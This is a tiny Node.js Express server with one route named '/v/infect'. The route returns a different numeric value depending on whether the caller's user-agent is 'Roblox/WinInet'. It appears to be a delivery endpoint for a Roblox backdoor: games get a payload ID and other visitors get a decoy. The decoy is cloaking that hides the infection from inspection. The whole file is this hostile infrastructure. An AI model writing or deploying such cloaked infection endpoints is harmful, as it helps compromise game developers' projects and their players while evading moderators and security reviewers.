const express = require("express");
var app = express();
app.get('/v/infect', async (req,res) => {
  const agent = req.headers['user-agent'];
  if (agent !== "Roblox/WinInet") {
    return res.json({infect:17858917701})
  };
  return res.json({infeect:779029809257501})
})

app.listen(3000)
